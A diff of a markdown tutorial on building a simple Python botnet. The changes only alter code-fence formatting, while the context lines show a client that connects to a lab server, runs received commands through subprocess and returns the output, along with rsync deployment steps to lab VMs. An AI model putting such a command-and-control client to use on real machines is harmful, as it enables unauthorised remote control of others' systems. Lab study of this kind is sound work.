@@ -125,7 +125,7 @@ import subprocess
 ```  
 
 The `botclient()` function creates a tcp socket and connects to the server:
-```python
+```python  
 def botclient():
     HOST = '192.168.100.152'#replace with the proper ip 
     PORT = 8000
@@ -155,7 +155,7 @@ while data != 'end':
 
 **message** contains the output for the command and is sent back to the server, after execution of the command we wait for another packet.  
 The complete file available on [github](https://github.com/0script/simple-botnet) should look like the one below:  
-```python
+```python  
 import socket
 import subprocess
 
@@ -196,7 +196,7 @@ $rsync botclient.py oraclevm@192.168.100.186:/home/oraclevm/oracleuser/simple-bo
 $rsync botclient.py ubuntu22@192.168.100.217:/home/ubuntu22/Desktop/ubuntu22
 ```  
 I can now launch the server in my kali machine  
-```
+```shell  
 $python3 botserver.py
 ```  
 
